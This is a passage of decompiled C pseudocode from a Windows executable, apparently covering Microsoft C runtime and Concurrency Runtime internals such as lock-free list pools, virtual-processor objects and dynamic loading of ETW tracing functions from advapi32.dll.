  if ( v1 )
    return sub_43C0BF((int)v1, a1);
  return result;
}

//----- (0043C296) --------------------------------------------------------
int __thiscall sub_43C296(_DWORD *this)
{
  return this[1];
}

//----- (0043C29A) --------------------------------------------------------
int __thiscall sub_43C29A(char *this)
{
  if ( !*(_DWORD *)this )
  {
    sub_42E75B((LPCRITICAL_SECTION)(this + 12));
    if ( !*(_DWORD *)this )
      *(_DWORD *)this = sub_43C261((int)this);
    sub_42E8A1((LPCRITICAL_SECTION)(this + 12));
  }
  return *(_DWORD *)this;
}

//----- (0043C2E2) --------------------------------------------------------
int __stdcall sub_43C2E2(_DWORD *a1, int nPriority)
{
  int result; // eax

  result = nPriority;
  if ( a1[6] != nPriority )
    return sub_442428(a1, nPriority);
  return result;
}

//----- (0043C2FA) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_43C2FA(char *this, struct _SINGLE_LIST_ENTRY *a2)
{
  PSLIST_ENTRY result; // eax
  union _SLIST_HEADER *v4; // edi

  result = 0;
  while ( a2[5].Next != (struct _SINGLE_LIST_ENTRY *)dword_4713BC[(_DWORD)result] )
  {
    result = (PSLIST_ENTRY)((char *)result + 1);
    if ( (int)result >= 4 )
      goto LABEL_4;
  }
  v4 = (union _SLIST_HEADER *)&this[8 * (_DWORD)result + 8];
  result = (PSLIST_ENTRY)QueryDepthSList(v4);
  if ( (unsigned __int16)result < dword_492838 )
    return InterlockedPushEntrySList(v4, a2 + 15);
LABEL_4:
  if ( a2 )
    return (PSLIST_ENTRY)(*(int (__thiscall **)(char *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)this + 32))(this, a2);
  return result;
}
// 4713BC: using guessed type int dword_4713BC[4];
// 492838: using guessed type int dword_492838;

//----- (0043C35B) --------------------------------------------------------
void __thiscall sub_43C35B(_BYTE *this, struct _SINGLE_LIST_ENTRY *a2)
{
  int v3; // eax
  union _SLIST_HEADER *v4; // edi
  PSLIST_ENTRY v5; // eax
  int i; // edx
  int v7; // edi

  if ( this[44] )
    goto LABEL_5;
  v3 = 0;
  while ( a2[5].Next != (struct _SINGLE_LIST_ENTRY *)dword_4713BC[v3] )
  {
    if ( ++v3 >= 4 )
      goto LABEL_5;
  }
  v4 = (union _SLIST_HEADER *)&this[8 * v3 + 8];
  if ( QueryDepthSList(v4) >= dword_492838 )
  {
LABEL_5:
    if ( a2 )
      (*(void (__thiscall **)(_BYTE *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)this + 32))(this, a2);
  }
  else
  {
    InterlockedPushEntrySList(v4, a2 + 15);
    if ( this[44] )
    {
      v5 = InterlockedFlushSList(v4);
      for ( i = v5 != 0 ? (unsigned int)&v5[-15] : 0; i; i = v7 != 0 ? v7 - 60 : 0 )
      {
        v7 = *(_DWORD *)(i + 60);
        (*(void (__thiscall **)(_BYTE *, int))(*(_DWORD *)this + 32))(this, i);
      }
    }
  }
}
// 4713BC: using guessed type int dword_4713BC[4];
// 492838: using guessed type int dword_492838;

//----- (0043C3FE) --------------------------------------------------------
signed __int32 __thiscall sub_43C3FE(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 10);
}

//----- (0043C408) --------------------------------------------------------
signed __int32 __thiscall sub_43C408(volatile signed __int32 *this)
{
  signed __int32 v1; // ebx

  v1 = _InterlockedDecrement(this + 10);
  if ( !v1 && this )
    (*(void (__thiscall **)(volatile signed __int32 *, int))(*this + 20))(this, 1);
  return v1;
}

//----- (0043C435) --------------------------------------------------------
int __thiscall sub_43C435(union _SLIST_HEADER *this, unsigned int a2, int a3)
{
  unsigned int v4; // ecx
  int *v5; // esi
  union _SLIST_HEADER *v6; // eax
  PSLIST_ENTRY v7; // eax
  int v8; // edi
  union _SLIST_HEADER *v10; // [esp+Ch] [ebp-4h]

  v4 = a2;
  v5 = dword_4713BC;
  v6 = this + 1;
  v10 = this + 1;
  do
  {
    if ( v4 <= *v5 )
    {
      v7 = InterlockedPopEntrySList(v6);
      v8 = v7 != 0 ? (unsigned int)&v7[-15] : 0;
      if ( v8 )
        goto LABEL_7;
      v6 = v10;
      v4 = a2;
    }
    ++v5;
    v10 = ++v6;
  }
  while ( (int)v5 < (int)&off_4713CC );
  v8 = ((int (__thiscall *)(union _SLIST_HEADER *, unsigned int))this->Next.Next[7].Next)(this, v4);
  if ( !v8 )
    return v8;
LABEL_7:
  ((void (__thiscall *)(union _SLIST_HEADER *, int, int))this->Next.Next[9].Next)(this, v8, a3);
  return v8;
}
// 43C47F: conditional instruction was optimized away because edi.4==0
// 4713BC: using guessed type int dword_4713BC[4];
// 4713CC: using guessed type int off_4713CC;

//----- (0043C4B7) --------------------------------------------------------
BOOL __stdcall sub_43C4B7(_DWORD *a1)
{
  return sub_442409(a1);
}

//----- (0043C4C6) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_43C4C6(union _SLIST_HEADER *this)
{
  int v1; // esi
  union _SLIST_HEADER *v2; // ebx
  PSLIST_ENTRY result; // eax
  int v4; // edx
  int v5; // edi
  int v7; // [esp+10h] [ebp-8h]
  union _SLIST_HEADER *v8; // [esp+14h] [ebp-4h]

  v1 = 4;
  v2 = this + 1;
  v8 = this + 1;
  v7 = 4;
  do
  {
    result = InterlockedFlushSList(v2);
    v4 = result != 0 ? (unsigned int)&result[-15] : 0;
    if ( v4 )
    {
      do
      {
        v5 = *(_DWORD *)(v4 + 60);
        ((void (__thiscall *)(union _SLIST_HEADER *, int))this->Next.Next[8].Next)(this, v4);
        result = (PSLIST_ENTRY)(v5 - 60);
        v4 = v5 != 0 ? v5 - 60 : 0;
      }
      while ( v4 );
      v2 = v8;
      v1 = v7;
    }
    ++v2;
    --v1;
    v8 = v2;
    v7 = v1;
  }
  while ( v1 );
  return result;
}

//----- (0043C532) --------------------------------------------------------
int __thiscall sub_43C532(int this)
{
  *(_BYTE *)(this + 44) = 1;
  sub_43C4C6((union _SLIST_HEADER *)this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)this + 12))(this);
}

//----- (0043C553) --------------------------------------------------------
void sub_43C553()
{
  if ( !dword_492838 )
    dword_492838 = 4 * sub_43268F();
}
// 492838: using guessed type int dword_492838;

//----- (0043C56F) --------------------------------------------------------
int *__thiscall sub_43C56F(int *this)
{
  HMODULE Library; // esi
  ULONG (__stdcall *RegisterTraceGuidsW)(WMIDPREQUEST, PVOID, LPCGUID, ULONG, PTRACE_GUID_REGISTRATION, LPCWSTR, LPCWSTR, PTRACEHANDLE); // eax
  ULONG (__stdcall *UnregisterTraceGuids)(TRACEHANDLE); // eax
  ULONG (__stdcall *TraceEvent)(TRACEHANDLE, PEVENT_TRACE_HEADER); // eax
  TRACEHANDLE (__stdcall *GetTraceLoggerHandle)(PVOID); // eax
  UCHAR (__stdcall *GetTraceEnableLevel)(TRACEHANDLE); // eax
  ULONG (__stdcall *GetTraceEnableFlags)(TRACEHANDLE); // eax

  Library = LoadLibraryExW(L"advapi32.dll", 0, 0x800u);
  if ( Library || GetLastError() == 87 && (Library = LoadLibraryW(L"advapi32.dll")) != 0 )
  {
    RegisterTraceGuidsW = (ULONG (__stdcall *)(WMIDPREQUEST, PVOID, LPCGUID, ULONG, PTRACE_GUID_REGISTRATION, LPCWSTR, LPCWSTR, PTRACEHANDLE))GetProcAddress(Library, "RegisterTraceGuidsW");
    *this = sub_430237((int)RegisterTraceGuidsW);
    UnregisterTraceGuids = (ULONG (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "UnregisterTraceGuids");
    this[1] = sub_430237((int)UnregisterTraceGuids);
    TraceEvent = (ULONG (__stdcall *)(TRACEHANDLE, PEVENT_TRACE_HEADER))GetProcAddress(Library, "TraceEvent");
    this[2] = sub_430237((int)TraceEvent);
    GetTraceLoggerHandle = (TRACEHANDLE (__stdcall *)(PVOID))GetProcAddress(Library, "GetTraceLoggerHandle");
    this[3] = sub_430237((int)GetTraceLoggerHandle);
    GetTraceEnableLevel = (UCHAR (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "GetTraceEnableLevel");
    this[4] = sub_430237((int)GetTraceEnableLevel);
    GetTraceEnableFlags = (ULONG (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "GetTraceEnableFlags");
    this[5] = sub_430237((int)GetTraceEnableFlags);
  }
  return this;
}

//----- (0043C669) --------------------------------------------------------
DWORD __stdcall sub_43C669(int a1, int a2, int a3, int a4)
{
  DWORD result; // eax
  int v5; // edx
  char v6; // bl
  int v7; // eax

  if ( a1 == 4 )
  {
    dword_492848 = sub_43C7A9(dword_492850, a4);
    dword_49284C = v5;
    if ( dword_492848 == -1 )
      return GetLastError();
    SetLastError(0);
    v6 = sub_43C76C(dword_492850, dword_492848, dword_49284C);
    if ( !v6 )
    {
      result = GetLastError();
      if ( result )
        return result;
      v6 = 4;
    }
    v7 = sub_43C72F(dword_492850, dword_492848, dword_49284C);
    if ( !v7 )
    {
      result = GetLastError();
      if ( result )
        return result;
      v7 = -1;
    }
    dword_492840 = v7;
    byte_492844 = v6;
  }
  else
  {
    if ( a1 != 5 )
      return 87;
    byte_492844 = 0;
    dword_492840 = 0;
    dword_492848 = 0;
    dword_49284C = 0;
  }
  return 0;
}
// 43C6B0: variable 'v5' is possibly undefined
// 492840: using guessed type int dword_492840;
// 492844: using guessed type char byte_492844;
// 492848: using guessed type int dword_492848;
// 49284C: using guessed type int dword_49284C;

//----- (0043C72F) --------------------------------------------------------
int __thiscall sub_43C72F(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[5];
  if ( v3 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return 0;
  }
  else
  {
    v4 = (int (__thiscall *)(_DWORD, int, int))sub_430237((int)v3);
    return v4(v4, a2, a3);
  }
}

//----- (0043C76C) --------------------------------------------------------
char __thiscall sub_43C76C(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[4];
  if ( v3 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return 0;
  }
  else
  {
    v4 = (int (__thiscall *)(_DWORD, int, int))sub_430237((int)v3);
    return v4(v4, a2, a3);
  }
}

//----- (0043C7A9) --------------------------------------------------------
int __thiscall sub_43C7A9(_DWORD *this, int a2)
{
  PVOID v2; // esi
  int (__thiscall *v3)(_DWORD, int); // esi

  v2 = (PVOID)this[3];
  if ( v2 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return -1;
  }
  else
  {
    v3 = (int (__thiscall *)(_DWORD, int))sub_430237((int)v2);
    return v3(v3, a2);
  }
}

//----- (0043C7E6) --------------------------------------------------------
int __thiscall sub_43C7E6(void **this, int a2, int a3, int a4, int a5, int a6)
{
  PVOID v6; // esi
  int (__thiscall *v7)(_DWORD, int, _DWORD, int, int, int, _DWORD, _DWORD, int); // esi

  v6 = *this;
  if ( v6 == EncodePointer(0) )
    return 127;
  v7 = (int (__thiscall *)(_DWORD, int, _DWORD, int, int, int, _DWORD, _DWORD, int))sub_430237((int)v6);
  return v7(v7, a2, 0, a3, a4, a5, 0, 0, a6);
}

//----- (0043C82A) --------------------------------------------------------
int __thiscall sub_43C82A(_DWORD *this, int a2, int a3, int a4)
{
  PVOID v4; // esi
  int (__thiscall *v5)(_DWORD, int, int, int); // esi

  v4 = (PVOID)this[2];
  if ( v4 == EncodePointer(0) )
    return 127;
  v5 = (int (__thiscall *)(_DWORD, int, int, int))sub_430237((int)v4);
  return v5(v5, a2, a3, a4);
}

//----- (0043C863) --------------------------------------------------------
int __thiscall sub_43C863(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[1];
  if ( v3 == EncodePointer(0) )
    return 127;
  v4 = (int (__thiscall *)(_DWORD, int, int))sub_430237((int)v3);
  return v4(v4, a2, a3);
}

//----- (0043C899) --------------------------------------------------------
__int32 sub_43C899()
{
  __int32 result; // eax
  int *v1; // eax
  int *v2; // eax

  result = sub_4304E3(&dword_492824);
  if ( !dword_492850 )
  {
    v1 = (int *)operator new(0x18u);
    if ( v1 )
      v2 = sub_43C56F(v1);
    else
      v2 = 0;
    dword_492850 = v2;
    result = sub_43C7E6((void **)v2, (int)sub_43C669, (int)&unk_471424, 7, (int)&off_48C358, (int)&dword_492858);
  }
  dword_492824 = 0;
  return result;
}
// 48C358: using guessed type void *off_48C358;
// 492824: using guessed type int dword_492824;
// 492858: using guessed type int dword_492858;

//----- (0043C908) --------------------------------------------------------
void sub_43C908()
{
  if ( dword_492850 )
  {
    byte_492844 = 0;
    dword_492840 = 0;
    sub_43C863(dword_492850, dword_492858, dword_49285C);
    sub_42CF7C(dword_492850);
    dword_492850 = 0;
  }
}
// 492840: using guessed type int dword_492840;
// 492844: using guessed type char byte_492844;
// 492858: using guessed type int dword_492858;
// 49285C: using guessed type int dword_49285C;

//----- (0043C94B) --------------------------------------------------------
int __cdecl sub_43C94B(int (__thiscall ***a1)(_DWORD, int))
{
  int result; // eax

  if ( a1 )
    return (**a1)(a1, 1);
  return result;
}

//----- (0043C96D) --------------------------------------------------------
_DWORD *__thiscall sub_43C96D(_DWORD *this, int a2)
{
  int v3; // eax
  _DWORD *v4; // ecx
  int v5; // edx
  void *v7; // [esp-8h] [ebp-2Ch]

  *this = 0;
  this[1] = 0;
  this[5] = a2;
  this[2] = 63;
  this[3] = unknown_libname_45(256);
  v3 = unknown_libname_45(512);
  if ( v3 )
  {
    v4 = (_DWORD *)v3;
    v5 = 64;
    do
    {
      *v4 = 0;
      v4 += 2;
      *(v4 - 1) = 0;
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v3 = 0;
  }
  v7 = (void *)this[3];
  this[4] = v3;
  memset(v7, 0, 0x100u);
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043C9EB) --------------------------------------------------------
_DWORD *__thiscall sub_43C9EB(_DWORD *this)
{
  _DWORD *v2; // esi

  v2 = this + 33;
  *this = &Concurrency::details::VirtualProcessor::`vftable';
  sub_43C96D(this + 4, (int)(this + 33));
  this[10] = 0;
  this[11] = 0;
  this[18] = 0;
  this[19] = 0;
  *v2 = 0;
  this[37] = 0;
  this[38] = 0;
  this[39] = 0;
  this[40] = 0;
  this[41] = 0;
  this[42] = 0;
  this[48] = 0;
  return this;
}
// 47158C: using guessed type void *Concurrency::details::VirtualProcessor::`vftable';

//----- (0043CA4B) --------------------------------------------------------
void __thiscall sub_43CA4B(void *this)
{
  *(_DWORD *)this = &Concurrency::details::VirtualProcessor::`vftable';
  if ( *((_DWORD *)this + 23) )
  {
    sub_4377DF(*((char **)this + 23));
    *((_DWORD *)this + 23) = 0;
  }
  j_j_j___free_base(*((void **)this + 42));
  sub_438221((void **)this + 4);
}
// 47158C: using guessed type void *Concurrency::details::VirtualProcessor::`vftable';

//----- (0043CAAB) --------------------------------------------------------
void *__thiscall sub_43CAAB(void *Block, char a2)
{
  sub_43CA4B(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0043CAD0) --------------------------------------------------------
bool __thiscall sub_43CAD0(_DWORD *this, unsigned int a2)
{
  volatile signed __int32 *v2; // edi
  int v3; // edx
  int v4; // eax

  v2 = (volatile signed __int32 *)(this[22] + 4 * (a2 >> 5));
  v3 = 1 << (a2 & 0x1F);
  v4 = v3 & *v2;
  if ( v4 )
    _InterlockedAnd(v2, ~v3);
  return v4 != 0;
}

//----- (0043CB05) --------------------------------------------------------
int __thiscall sub_43CB05(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    sub_43EC56((_DWORD *)a2);
    result = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 28))(a2, this);
  }
  this[31] = a2;
  if ( a2 )
  {
    if ( (*(_BYTE *)(a2 + 179) & 1) != 0 )
    {
      ++this[27];
      *(_BYTE *)(a2 + 179) &= ~1u;
    }
  }
  return result;
}

//----- (0043CB4E) --------------------------------------------------------
bool __thiscall sub_43CB4E(int this)
{
  if ( !*(_BYTE *)(this + 98) )
    return sub_43CAD0(**(_DWORD ***)(this + 80), *(_DWORD *)(this + 144));
  *(_BYTE *)(this + 98) = 0;
  return 1;
}

//----- (0043CBA1) --------------------------------------------------------
char __cdecl sub_43CBA1(int a1)
{
  char result; // al
  _DWORD *v2; // esi
  int (__thiscall ***v3)(_DWORD, int); // eax

  result = sub_436498(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = (int (__thiscall ***)(_DWORD, int))(v2 - 47);
      v2 = (_DWORD *)*v2;
      sub_43C94B(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0043CBAD) --------------------------------------------------------
char __thiscall sub_43CBAD(__int32 this, __int32 *a2, int a3, char a4)
{
  volatile signed __int32 *v5; // ebx
  signed __int32 v6; // edi
  __int32 v7; // ecx
  char result; // al
  signed __int32 v9; // eax

  v5 = (volatile signed __int32 *)(this + 8);
  v6 = *(_DWORD *)(this + 8);
  if ( (v6 & a3) == 0 )
    return 0;
  if ( a3 != 15 )
  {
    while ( 1 )
    {
      v9 = _InterlockedCompareExchange(v5, 0, v6);
      v7 = v9;
      if ( v9 == v6 )
        break;
      v6 = v9;
      if ( (v9 & a3) == 0 )
        return 0;
    }
    goto LABEL_4;
  }
  v7 = _InterlockedExchange(v5, 0);
  if ( !v7 )
    return 0;
LABEL_4:
  if ( a4 )
  {
    _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 436));
    _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 28));
    if ( v7 == 4 || v7 == 8 )
    {
      _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 440));
      _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 32));
    }
  }
  *a2 = v7;
  a2[1] = this;
  result = 1;
  *(_DWORD *)(this + 12) = v7;
  return result;
}

//----- (0043CC3B) --------------------------------------------------------
signed __int32 __thiscall sub_43CC3B(_DWORD *this, int a2)
{
  signed __int32 result; // eax

  result = 1;
  if ( *(_DWORD *)((a2 << 7) + this[23]) == 1 )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 0, 1);
  return result;
}

//----- (0043CC60) --------------------------------------------------------
int __thiscall sub_43CC60(_DWORD **this, int a2)
{
  return (*(int (__thiscall **)(_DWORD *, int))(*this[22] + 24))(this[22], a2);
}

//----- (0043CC82) --------------------------------------------------------
int __thiscall sub_43CC82(_DWORD **this, int a2)
{
  return (*(int (__thiscall **)(_DWORD *, int))(*this[22] + 28))(this[22], a2);
}

//----- (0043CCA4) --------------------------------------------------------
char __thiscall sub_43CCA4(_DWORD **this, __int32 a2, int a3, struct _SINGLE_LIST_ENTRY *a4)
{
  volatile signed __int32 *v5; // esi
  int v7; // eax

  v5 = (volatile signed __int32 *)*this[20];
  if ( a2 == 1 || a2 == 4 )
  {
    if ( sub_437F9D(v5, 1) )
    {
      v7 = a3;
      if ( !a3 )
        v7 = sub_435E50(v5);
      return ((int (__thiscall *)(_DWORD **, int, struct _SINGLE_LIST_ENTRY *))(*this)[7])(this, v7, a4);
    }
    else
    {
      if ( a4 )
        sub_437280((int)v5, a4, 1);
      sub_43CF95((int)this, a2, 0);
      return 0;
    }
  }
  else
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(*this[22] + 20))(this[22], this[32]);
    return 1;
  }
}

//----- (0043CD35) --------------------------------------------------------
char __thiscall sub_43CD35(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  char result; // al

  result = 0;
  if ( *(_DWORD *)this )
  {
    result = sub_43CCA4(
               *(_DWORD ***)(this + 4),
               *(_DWORD *)this,
               *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 4) + 80) + 4) + 8),
               a2);
    *(_DWORD *)this = 0;
  }
  return result;
}

//----- (0043CD60) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_43CD60(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  result = (PSLIST_ENTRY)this[23];
  if ( !result )
  {
    result = sub_436305(0);
    this[23] = result;
  }
  return result;
}

//----- (0043CD76) --------------------------------------------------------
int __thiscall sub_43CD76(unsigned int *this, int a2)
{
  unsigned int *v3; // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  sub_435B2A(this + 90, &a2, &v3);
  return (int)v3;
}

//----- (0043CD94) --------------------------------------------------------
int __thiscall sub_43CD94(int this, int a2, int a3)
{
  unsigned int **v3; // eax
  unsigned int *v4; // ebx
  int v5; // eax
  _DWORD *v6; // esi
  int v7; // eax
  __int64 v8; // rax
  int v9; // eax
  int v10; // edi
  int *v11; // eax
  unsigned int v12; // esi
  int v13; // ebx
  int v14; // eax
  int v16[4]; // [esp+Ch] [ebp-14h] BYREF
  int v17; // [esp+1Ch] [ebp-4h]

  v17 = this;
  *(_DWORD *)(this + 80) = a2;
  *(_DWORD *)(this + 200) = 0;
  *(_DWORD *)(this + 204) = 0;
  *(_DWORD *)(this + 224) = 1;
  *(_DWORD *)(this + 212) = 1;
  *(_DWORD *)(this + 120) = 0;
  *(_DWORD *)(this + 84) = *(_DWORD *)(a2 + 4);
  v3 = *(unsigned int ***)(this + 80);
  *(_WORD *)(this + 172) = 0;
  *(_DWORD *)(this + 88) = a3;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 104) = 0;
  *(_DWORD *)(this + 108) = 0;
  *(_DWORD *)(this + 112) = 0;
  *(_DWORD *)(this + 116) = 0;
  *(_DWORD *)(this + 124) = 0;
  *(_DWORD *)(this + 176) = 0;
  *(_DWORD *)(this + 192) = 0;
  *(_DWORD *)(this + 92) = 0;
  *(_WORD *)(this + 96) = 0;
  *(_BYTE *)(this + 98) = 1;
  v4 = *v3;
  *(_DWORD *)(v17 + 136) = (*(int (__thiscall **)(int))(*(_DWORD *)a3 + 16))(a3);
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)a3 + 4))(a3);
  v6 = (_DWORD *)v17;
  *(_DWORD *)(v17 + 140) = v5;
  v6[36] = sub_43CD76(v4, v5);
  v7 = sub_43268F();
  sub_4363A8(v6 + 41, v7);
  sub_43D613(v6 + 41);
  *(_DWORD *)(v6[42] + 4 * (v6[36] >> 5)) |= 1 << (v6[36] & 0x1F);
  v8 = sub_442C4A((_DWORD *)(v17 + 40), v17, (unsigned int)(v4[3] != 0) + 1);
  v9 = (*(int (__fastcall **)(_DWORD, _DWORD))(***(_DWORD ***)(v17 + 80) + 4))(**(_DWORD **)(v17 + 80), HIDWORD(v8));
  v10 = v17;
  v11 = sub_4424D7(v16, 3, *(_DWORD *)(v17 + 140), v9, v17);
  sub_4380FD((int *)(v10 + 148), v11);
  v12 = *(_DWORD *)(v10 + 144);
  sub_43CF51(v4 + 18, v12);
  sub_43CC3B(v4, v12);
  v13 = *(_DWORD *)(v10 + 136);
  v14 = (*(int (__thiscall **)(_DWORD))(***(_DWORD ***)(v10 + 80) + 4))(**(_DWORD **)(v10 + 80));
  return sub_43D588(1, 4u, v14, v13);
}
// 43CD94: using guessed type int var_14[4];

//----- (0043CF11) --------------------------------------------------------
signed __int32 __thiscall sub_43CF11(_DWORD *this, unsigned int a2)
{
  signed __int32 v3; // esi

  v3 = _InterlockedDecrement((volatile signed __int32 *)(this[2] + 4 * a2));
  if ( !v3 )
  {
    sub_43D429(this, a2);
    _InterlockedAnd((volatile signed __int32 *)(this[1] + 4 * (a2 >> 5)), ~(1 << (a2 & 0x1F)));
  }
  return v3;
}

//----- (0043CF51) --------------------------------------------------------
signed __int32 __thiscall sub_43CF51(_DWORD *this, unsigned int a2)
{
  signed __int32 v2; // esi

  v2 = _InterlockedIncrement((volatile signed __int32 *)(this[2] + 4 * a2));
  if ( v2 == 1 )
  {
    sub_43D3E1(this, a2);
    _InterlockedOr((volatile signed __int32 *)(this[1] + 4 * (a2 >> 5)), 1 << (a2 & 0x1F));
  }
  return v2;
}

//----- (0043CF95) --------------------------------------------------------
int __thiscall sub_43CF95(int this, __int32 a2, char a3)
{
  int result; // eax

  *(_DWORD *)(this + 128) = *(_DWORD *)(this + 124);
  if ( a3 && (a2 == 1 || a2 == 4) )
    sub_437F9D(**(volatile signed __int32 ***)(this + 80), 0);
  _InterlockedIncrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 436));
  _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 28));
  if ( a2 == 4 || a2 == 8 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 440));
    _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 32));
  }
  result = this + 8;
  _InterlockedExchange((volatile __int32 *)(this + 8), a2);
  return result;
}

//----- (0043D005) --------------------------------------------------------
char __thiscall sub_43D005(_BYTE *this)
{
  char result; // al
  __int32 v3; // esi
  int v4; // ebx
  volatile signed __int32 *v5; // edi
  int v6; // eax
  __int32 v7[2]; // [esp+Ch] [ebp-8h] BYREF

  v7[0] = 0;
  result = sub_43CBAD((__int32)this, v7, 15, 1);
  if ( result )
  {
    v3 = v7[0];
    if ( v7[0] == 2 || v7[0] == 8 )
    {
      v4 = v7[1];
      this[173] = 1;
      v5 = **(volatile signed __int32 ***)(v4 + 80);
      if ( v3 == 1 || v3 == 4 )
      {
        if ( sub_437F9D(v5, 1) )
        {
          v6 = sub_435E50(v5);
          return (*(int (__thiscall **)(int, int, _DWORD))(*(_DWORD *)v4 + 28))(v4, v6, 0);
        }
        else
        {
          return sub_43CF95(v4, v3, 0);
        }
      }
      else
      {
        return (*(int (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(v4 + 88) + 20))(
                 *(_DWORD *)(v4 + 88),
                 *(_DWORD *)(v4 + 128));
      }
    }
    else
    {
      return (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 12))(this);
    }
  }
  else
  {
    this[173] = 1;
  }
  return result;
}

//----- (0043D0C1) --------------------------------------------------------
signed __int32 __thiscall sub_43D0C1(int this)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(**(_DWORD **)(this + 80) + 428) + 20))(
         *(_DWORD *)(**(_DWORD **)(this + 80) + 428),
         *(_DWORD *)(this + 88));
  return sub_43D8D5(*(_DWORD **)(this + 80), v2, 1);
}

//----- (0043D0F4) --------------------------------------------------------
int __thiscall sub_43D0F4(_DWORD *this)
{
  int v1; // edi
  int v2; // eax
  int v3; // edx
  __int32 v4; // ebx

  v1 = this[1] - 1;
  v2 = this[3];
  v3 = v1 & this[2];
  this[1] = v1;
  v4 = _InterlockedExchange((volatile __int32 *)(v2 + 4 * v3), 0);
  if ( !v4 )
  {
    this[1] = v1 + 1;
    return v4;
  }
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_43875A((int *)(this[4] + 8 * (v1 & this[2])), 0) )
    return v4;
  return 1;
}

//----- (0043D142) --------------------------------------------------------
char __thiscall sub_43D142(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 47;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_436498(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_436B3C(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_43CBA1,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0043D236) --------------------------------------------------------
char __thiscall sub_43D236(int **this)
{
  int v1; // edi
  _DWORD *v2; // ebx
  int v3; // eax
